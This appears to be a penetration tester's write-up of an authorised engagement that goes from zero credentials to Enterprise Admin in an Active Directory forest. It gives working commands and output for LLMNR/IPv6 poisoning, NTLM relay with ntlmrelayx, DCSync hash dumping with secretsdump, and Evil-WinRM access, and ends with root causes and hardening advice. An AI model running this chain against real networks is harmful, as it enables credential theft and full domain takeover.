## Introduction

Active Directory remains the backbone of most corporate network environments. Despite being a mature technology with decades of security research behind it, misconfigurations and default settings continue to provide avenues for attackers to gain complete control of Windows domains.

This article details how I went from having zero credentials to obtaining Enterprise Admin access during a recent engagement. The attack chain demonstrates how several seemingly minor misconfigurations can be chained together to compromise an entire Active Directory forest—without exploiting any unpatched vulnerabilities.

## Initial Reconnaissance

The first phase of any internal network test involves thorough enumeration to identify potential targets and vulnerabilities. Using standard tools like Nmap, Nessus Professional, and custom scripts, I performed an intensive network scan covering all 65,535 TCP ports and key UDP ports to discover the attack surface.

```bash
sudo nmap -sS -sV -p- --min-rate 10000 -oA full_scan 192.168.0.0/24
sudo nmap -sU -sV --top-ports 200 -oA udp_scan 192.168.0.0/24
```

The scans revealed a substantial Windows environment with numerous servers and workstations, providing plenty of targets for further investigation.

## Identifying Key Misconfigurations

### SMB Signing Not Required

SMB signing provides integrity protection for SMB traffic, preventing man-in-the-middle attacks. When it's not required, attackers can intercept and relay authentication attempts to gain unauthorized access. I used NetExec (formerly CrackMapExec) to identify hosts with SMB signing not required:

```bash
nxc smb 192.168.0.0/24 --gen-relay-list smb_targets.txt
```

The results were promising—virtually all machines in the domain had SMB signing disabled:

```text
SMB         192.168.0.11       445    DC-SERVER01      [*] Windows Server 2022 Build 20348 x64 (name:DC-SERVER01) (domain:CORP.local) (signing:False) (SMBv1:False)
SMB         192.168.0.10       445    APP-SERVER01     [*] Windows Server 2022 Build 20348 x64 (name:APP-SERVER01) (domain:CORP.local) (signing:False) (SMBv1:False)
SMB         192.168.0.28       445    SQL-SERVER01     [*] Windows 10 / Server 2016 Build 14393 x64 (name:SQL-SERVER01) (domain:CORP.local) (signing:False) (SMBv1:False)
```

### Setting Up for MITM Attacks

Given the SMB signing issues, the next logical step was to attempt network poisoning to intercept authentication traffic. This approach leverages how Windows systems attempt to resolve hostnames and authenticate to network resources.

#### LLMNR/NBT-NS Poisoning with Responder

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are name resolution protocols used by Windows when DNS fails. These protocols are vulnerable to poisoning attacks where an attacker can respond to broadcast queries and capture authentication hashes.

```bash
sudo responder -I eth0 -wd
```

```text
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [OFF]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [OFF]
    SQL server                 [OFF]
    FTP server                 [OFF]
    IMAP server                [OFF]
    POP3 server                [OFF]
    SMTP server                [OFF]
    DNS server                 [OFF]
    LDAP server                [OFF]
    MQTT server                [OFF]
    RDP server                 [OFF]
    DCE-RPC server             [OFF]
    WinRM server               [OFF]
    SNMP server                [OFF]
```

#### IPv6 DNS Poisoning with MITM6

To increase my chances of intercepting authentication, I also deployed MITM6. This tool exploits the fact that Windows prioritizes IPv6 over IPv4 by default, but many corporate networks haven't properly secured their IPv6 implementation.

```bash
sudo mitm6 -d corp.local
```

```text
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:0c:29:9a:b1:c2]
IPv4 address: 192.168.0.3
IPv6 address: fe80::20c:29ff:fe9a:b1c2
DNS local search domain: corp.local
DNS allowlist: corp.local
Sent spoofed reply for FILE-SERVER01.corp.local. to fe80::1eb8:804e:abdc:2526
IPv6 address fe80::3908:1 is now assigned to mac=fc:3f:db:53:fd:1d
Sent spoofed reply for DC-APPSERVER.corp.local. to fe80::a1c2:7cd2:e569:b991
Sent spoofed reply for wpad.corp.local. to fe80::a1c2:7cd2:e569:b991
```

### Credential Capture

After running Responder and MITM6 for just a short time, I captured several NTLMv2 hashes from domain users and service accounts:

```text
[*] [NTLM] NTLMv2-SSP Client   : 192.168.0.107
[*] [NTLM] NTLMv2-SSP Username : CORP\FILE-SERVER01$
[*] [NTLM] NTLMv2-SSP Hash     : FILE-SERVER01$::CORP:1122334455667788:A1B2C3D4E5F6A7B8C9D0A1B2C3D4E5F6:0101000000000000...

[*] [NTLM] NTLMv2-SSP Client   : 192.168.0.64
[*] [NTLM] NTLMv2-SSP Username : CORP\jifko.admin
[*] [NTLM] NTLMv2-SSP Hash     : jifko.admin::CORP:1122334455667788:A1B2C3D4E5F6A7B8C9D0A1B2C3D4E5F6:0101000000000000...

[*] [NTLM] NTLMv2-SSP Client   : 192.168.0.28
[*] [NTLM] NTLMv2-SSP Username : CORP\sqlservice
[*] [NTLM] NTLMv2-SSP Hash     : sqlservice::CORP:1122334455667788:A1B2C3D4E5F6A7B8C9D0A1B2C3D4E5F6:0101000000000000...
```

## Understanding NTLM Relay Attacks

NTLM is Microsoft's legacy authentication protocol used throughout Active Directory. In a standard NTLM exchange, a client sends an authentication request, the server responds with a challenge, and the client returns a response based on its password hash. The server verifies this response to authenticate the user.

During a relay attack, I position myself in the middle of this exchange:

- The client authenticates to me, thinking I'm legitimate.
- I forward the authentication messages to a target of my choosing.
- The target responds with a challenge, which I relay back to the client.
- The client responds with valid credentials, which I pass to the target, effectively impersonating that user without knowing the password.

I never need to crack a single password hash—I'm simply relaying the legitimate authentication messages in real time. This is why SMB signing is critical: it cryptographically links the authentication messages together to prevent this kind of manipulation.

## Impacket: The Red Team's Network Protocol Toolkit

For the relay attacks, I turned to Impacket—the go-to Python framework for low-level protocol manipulation. It lets you craft, dissect, and manipulate network packets across virtually all Windows protocols including SMB, MSRPC, NTLM, and Kerberos.

My attack chain relied primarily on two Impacket tools: `ntlmrelayx` for relaying NTLM authentication and `secretsdump` for extracting credentials via DCSync. Other useful tools include `psexec`, `wmiexec`, `smbexec`, `GetUserSPNs`, and `GetNPUsers`.

## NTLM Relay Attack

### Setting up NTLM Relay to LDAP

Having identified machines with SMB signing disabled and captured authentication attempts, I set up an NTLM relay attack with Impacket's `ntlmrelayx`. Rather than trying to crack the hashes, I relayed them to the domain controller's LDAP service.

```bash
sudo impacket-ntlmrelayx \
  -t ldap://dc-server01.corp.local:389 \
  --delegate-access \
  --no-smb-server
```

Command flags:

- `-t ldap://dc-server01.corp.local:389`: Target the LDAP service on the domain controller.
- `--delegate-access`: Attempt to configure delegation rights on created computer accounts.
- `--no-smb-server`: Do not start an SMB server because Responder handles credential capture.

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled
```

### Successful Relay and Computer Account Creation

After running the relay setup for some time, I captured and successfully relayed an authentication attempt from a workstation account:

```text
[*] HTTPD(80): Connection from 192.168.0.99 controlled, attacking target ldap://dc-server01.corp.local:389
[*] HTTPD(80): Authenticating against ldap://dc-server01.corp.local:389 as CORP\WORKSTATION-690$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] Attempting to create computer in: CN=Computers,DC=corp,DC=local
[*] Adding new computer with username: ATTACKER-PC01$ and password: s0m3p455w0rd result: OK
[*] Delegation rights modified succesfully!
[*] ATTACKER-PC01$ can now impersonate users on WORKSTATION-690$ via S4U2Proxy
[*] Adding new computer with username: ATTACKER-PC02$ and password: s0m3p455w0rd result: OK
[*] Delegation rights modified succesfully!
[*] ATTACKER-PC02$ can now impersonate users on WORKSTATION-690$ via S4U2Proxy
```

This was critical—the tool successfully created two machine accounts with delegation rights, meaning they could impersonate users on the targeted workstation through Resource-Based Constrained Delegation (RBCD). The S4U2Proxy reference is "Service for User to Proxy," a Kerberos extension that allows a service to request tickets on behalf of users. When misconfigured, it becomes a powerful privilege escalation vector.

### Escalating to DCSync Privileges

Even more importantly, the relay attack modified domain ACLs to grant DCSync privileges to one of the created accounts:

```text
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Querying domain security descriptor
[*] Success! User ATTACKER-PC02$ now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20250514-052034.restore
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Adding user: ATTACKER-PC02$ to group Enterprise Admins result: OK
[*] Privilege escalation successful, shutting down...
```

The relay attack granted the machine account the `Replication-Get-Changes-All` privilege on the domain and added it to the Enterprise Admins group, essentially providing complete control over the entire Active Directory forest.

## The DCSync Attack Explained

DCSync simulates a domain controller requesting password data from another DC. It's a legitimate replication mechanism that domain controllers use to synchronize their copies of the Active Directory database (NTDS.dit). When executed, a DCSync attack sends a Directory Replication Service request to a domain controller, asking it to send back sensitive user data—specifically password hashes.

The key permission needed for this attack is `Replication-Get-Changes-All`, which is normally only granted to:

- Domain Controllers
- Administrator accounts
- Specific service accounts that need to replicate AD data

In this case, the NTLM relay attack added this permission to the created machine account, giving the ability to extract password hashes for any account in the domain, including the most privileged users.

## Why DCSync Is So Powerful

- It is stealthy and uses legitimate replication protocols rather than exploiting vulnerabilities.
- It bypasses common defenses like Credential Guard or Protected Users groups.
- It extracts all credentials from the domain, including service accounts and privileged users.
- It does not require direct access to the NTDS.dit file and can be performed remotely.
- It leaves minimal traces in the event logs compared to other extraction methods.

## Domain Takeover via DCSync

### Extracting NTLM Hashes with Secretsdump

With a machine account that has DCSync privileges, I could extract password hashes for any domain user, including the `krbtgt` account and Domain Admins.

```bash
impacket-secretsdump \
  -dc-ip 192.168.0.206 \
  -just-dc \
  CORP.LOCAL/ATTACKER-PC02\\$:"s0m3p455w0rd"@192.168.0.206
```

Parameters:

- `-dc-ip 192.168.0.206`: IP address of the domain controller.
- `-just-dc`: Only extract domain credentials (not local SAM hashes).
- `CORP.LOCAL/ATTACKER-PC02$:"s0m3p455w0rd"`: Authenticate using the machine account.
- `@192.168.0.206`: Target domain controller.

```text
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
CORP.local\Administrator:500:HASH:HASH:::
Guest:501:HASH:HASH:::
krbtgt:502:HASH:HASH:::
CORP\user1:1126:HASH:HASH:::
[MANY MORE ACCOUNTS]
```

Each hash contains the username and RID, followed by the LM hash (typically empty in modern systems) and the NT hash. The `krbtgt` hash is gold for creating Golden Tickets, while the Administrator hash provides immediate access to domain controllers and other systems.

### Confirming Enterprise Admin Access

To verify the success of the attack, I used Evil-WinRM to establish a remote PowerShell session to a domain controller:

```bash
evil-winrm -i 192.168.0.206 -u 'ATTACKER-PC02$' -p 's0m3p455w0rd'
```

```text
*Evil-WinRM* PS C:\Users\ATTACKER-PC02$\Documents> net group "Enterprise Admins" /domain
Group name     Enterprise Admins
Comment        Designated administrators of the enterprise

Members

-------------------------------------------------------------------------------
Administrator            ATTACKER-PC02$          domainadmin
sql_admin                svcaccount
The command completed successfully.
```

This confirmed Enterprise Admin privileges, completing the attack chain from zero credentials to full Active Directory forest control.

## Machine Account Quota: The Critical Misconfiguration

The crucial enabler for this attack chain was the default Machine Account Quota (MAQ) setting. This often-overlooked Active Directory configuration determines how many computer accounts a regular user can add to the domain.

```bash
netexec ldap 192.168.0.206 -u 'ATTACKER-PC02$' -p 's0m3p455w0rd' -d corp.local -M maq
```

```text
LDAP        192.168.0.206      389    DC-SERVER01      [*] Windows Server 2022 Build 20348 (name:DC-SERVER01) (domain:CORP.local)
LDAP        192.168.0.206      389    DC-SERVER01      [+] corp.local\ATTACKER-PC02$:s0m3p455w0rd
MAQ         192.168.0.206      389    DC-SERVER01      [*] Getting the MachineAccountQuota
MAQ         192.168.0.206      389    DC-SERVER01      MachineAccountQuota: 10
```

In this environment, the MAQ was set to the default value of 10, allowing any authenticated user to create up to 10 computer accounts. This default setting provided the foothold needed for the attack—without it, the NTLM relay would not have been able to create the machine accounts that subsequently received DCSync privileges.

## From Zero Access to Enterprise Admin: The Full Attack Path

- Identify systems with SMB signing disabled and begin network poisoning.
- Capture authentication traffic using LLMNR/NBT-NS poisoning and IPv6 DNS spoofing.
- Relay authentication attempts to LDAP via `ntlmrelayx`, creating machine accounts with RBCD rights.
- Modify domain ACLs to grant DCSync privileges and Enterprise Admin membership.
- Extract password hashes for all domain users using `secretsdump`.
- Confirm complete control with Evil-WinRM and Enterprise Admin group verification.

## Root Causes & Attack Chain Summary

- **SMB signing not required:** Enabled NTLM relay attacks against services like LDAP.
- **LLMNR/NBT-NS enabled:** Allowed poisoning attacks to capture authentication attempts.
- **IPv6 DNS misconfiguration:** MITM6 spoofed DNS responses over IPv6.
- **Weak ACLs on domain objects:** Relayed authentication could modify domain ACLs for privilege escalation.
- **High Machine Account Quota:** Default of 10 computer accounts per user enabled creation of attack accounts.

## Conclusion

This attack chain demonstrates how a series of common misconfigurations can lead to complete domain compromise, even without exploiting software vulnerabilities. Starting from zero credentials, I was able to:

- Identify machines with SMB signing disabled.
- Capture authentication attempts using LLMNR/NBT-NS poisoning and IPv6 DNS spoofing.
- Relay those authentication attempts to create privileged computer accounts.
- Escalate to DCSync privileges and Enterprise Admin membership.
- Extract password hashes for all domain users.
- Confirm complete control over the domain.

Many of these misconfigurations exist by default in Windows environments. Organizations need to proactively harden their Active Directory configurations to protect against these attack vectors. Security is not just about patching the latest vulnerabilities—it is about properly configuring and securing the foundations of your infrastructure.